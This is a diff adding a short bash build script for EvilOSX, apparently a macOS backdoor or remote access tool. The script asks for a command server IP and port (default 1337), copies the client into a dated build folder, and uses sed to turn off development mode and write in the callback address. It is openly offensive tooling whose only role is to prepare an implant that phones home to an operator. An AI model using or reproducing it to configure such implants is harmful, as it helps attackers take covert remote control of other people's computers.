@@ -1,0 +1,38 @@
+#!/bin/bash
+
+MESSAGE_INPUT='\033[1m[?]\033[0m'
+MESSAGE_INFO='\033[94m[I]\033[0m'
+MESSAGE_ATTENTION='\033[91m[!]\033[0m'
+
+if [ $# -eq 0 ]; then
+    echo -e "${MESSAGE_ATTENTION} Please specify EvilOSX.py (client)."
+    exit 1
+fi
+
+EvilOSX=$1
+BuildPath=Builds/$(date '+%a-%b-%d@%H-%M-%S')
+
+mkdir -p $BuildPath
+cp $EvilOSX $BuildPath
+
+
+echo -e -n "${MESSAGE_INPUT} Server IP (where EvilOSX will connect to): "
+read -p '' host
+if [[ -z "$host" ]]; then
+    echo -e "${MESSAGE_ATTENTION} Invalid server IP address."
+	exit 1
+fi
+
+echo -e -n "${MESSAGE_INPUT} Server port (default is 1337): "
+read -p '' port
+if [[ -z "$port" ]]; then
+	port=1337
+fi
+
+echo -e "${MESSAGE_INFO} Configuring EvilOSX.py..."
+
+sed -i '' -e "s/development = True/development = False/g" $BuildPath/EvilOSX.py
+sed -i '' -e "s/SERVER_HOST =.*/SERVER_HOST = \"${host}\"/g" $BuildPath/EvilOSX.py
+sed -i '' -e "s/SERVER_PORT =.*/SERVER_PORT = ${port}/g" $BuildPath/EvilOSX.py
+
+echo -e "${MESSAGE_INFO} Done! File located at: $BuildPath/EvilOSX.py"
